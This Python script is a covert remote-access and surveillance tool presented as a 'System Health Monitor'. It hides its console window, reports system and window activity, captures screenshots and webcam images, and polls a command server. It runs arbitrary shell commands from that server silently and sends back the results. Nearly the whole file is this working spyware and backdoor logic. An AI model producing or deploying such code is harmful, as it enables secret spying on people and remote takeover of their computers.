import sys
import os
import ctypes
import subprocess
import psutil
import requests
import time
from PIL import ImageGrab
import io
import base64
from datetime import datetime
import socket
import threading
import json
from pathlib import Path

if sys.platform == 'win32':
    import win32gui
    import win32con
    import win32api
    import win32process
    from pynput import keyboard, mouse
    
    def hide_console():
        try:
            window = ctypes.windll.kernel32.GetConsoleWindow()
            if window:
                ctypes.windll.user32.ShowWindow(window, 0)
        except:
            pass
    
    hide_console()

# Configuration
SERVER_URL = "http://127.0.0.1:5000"
API_KEY = "dev"
SCREENSHOT_INTERVAL = 300
HEARTBEAT_INTERVAL = 30

class SilentMonitor:
    def __init__(self):
        self.pc_id = socket.gethostname()
        self.running = True
        self.keylog_buffer = []
        self.file_changes = []
        self.monitored_folders = [
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Downloads")
        ]

    def show_debug_msg(self):
        """Temporary message box to confirm the script is running"""
        # 0x40 is the code for an Information Icon + OK button
        ctypes.windll.user32.MessageBoxW(0, "System Health Monitor is now active.", "Debug Status", 0x40)

    def get_system_info(self):
        return {
            'pc_id': self.pc_id,
            'cpu': psutil.cpu_percent(interval=1),
            'ram': psutil.virtual_memory().percent,
            'ram_used': f"{psutil.virtual_memory().used / (1024**3):.1f}GB",
            'ram_total': f"{psutil.virtual_memory().total / (1024**3):.1f}GB",
            'disk_used': f"{psutil.disk_usage('/').used / (1024**3):.1f}GB",
            'disk_total': f"{psutil.disk_usage('/').total / (1024**3):.1f}GB",
            'uptime': int(time.time() - psutil.boot_time()),
            'active_window': self.get_active_window(),
            'running_apps': self.get_running_apps(),
            'network_connections': len(psutil.net_connections()),
            'timestamp': datetime.now().isoformat()
        }

    def get_active_window(self):
        try:
            window = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(window)
        except:
            return "Unknown"

    def get_running_apps(self):
        apps = []
        for proc in psutil.process_iter(['name', 'cpu_percent', 'memory_percent']):
            try:
                if proc.info['cpu_percent'] > 0 or proc.info['memory_percent'] > 1:
                    apps.append({
                        'name': proc.info['name'],
                        'cpu': proc.info['cpu_percent'],
                        'memory': round(proc.info['memory_percent'], 2)
                    })
            except: pass
        return sorted(apps, key=lambda x: x['cpu'], reverse=True)[:10]

    def capture_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=50)
            return base64.b64encode(buffer.getvalue()).decode()
        except: return None

    def capture_webcam(self):
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                return base64.b64encode(buffer).decode()
        except: pass
        return None

    def send_data(self, endpoint, data):
        try:
            data['pc_id'] = self.pc_id
            data['timestamp'] = datetime.now().isoformat()
            requests.post(
                f"{SERVER_URL}{endpoint}",
                json=data,
                headers={'Authorization': f'Bearer {API_KEY}'},
                timeout=10
            )
        except: pass

    def heartbeat_loop(self):
        while self.running:
            try:
                data = self.get_system_info()
                self.send_data('/heartbeat', data)
            except: pass
            time.sleep(HEARTBEAT_INTERVAL)

    def check_commands(self):
        while self.running:
            try:
                response = requests.get(
                    f"{SERVER_URL}/commands/{self.pc_id}",
                    headers={'Authorization': f'Bearer {API_KEY}'},
                    timeout=10
                )
                if response.status_code == 200:
                    commands = response.json()
                    for cmd in commands:
                        self.execute_command(cmd)
            except: pass
            time.sleep(30)

    def execute_command(self, command):
        cmd_type = command.get('type')
        if cmd_type == 'screenshot':
            img = self.capture_screenshot()
            if img: self.send_data('/screenshot', {'image': img, 'on_demand': True})
        elif cmd_type == 'webcam':
            img = self.capture_webcam()
            if img: self.send_data('/webcam', {'image': img})
        elif cmd_type == 'execute':
            try:
                result = subprocess.run(command['cmd'], shell=True, capture_output=True, text=True, timeout=30, creationflags=0x08000000)
                self.send_data('/command_result', {'output': result.stdout, 'error': result.stderr})
            except: pass

    def run(self):
        """Main execution"""
        # 1. Show the debug message first (remove this line later)
        self.show_debug_msg()
        
        # 2. Wait for system to stabilize
        time.sleep(5) 
        
        # 3. Send startup notification
        self.send_data('/event', {'event': 'startup'})
        
        # 4. Start background threads
        threading.Thread(target=self.heartbeat_loop, daemon=True).start()
        threading.Thread(target=self.check_commands, daemon=True).start()
        
        while self.running:
            time.sleep(60)

if __name__ == "__main__":
    monitor = SilentMonitor()
    monitor.run()
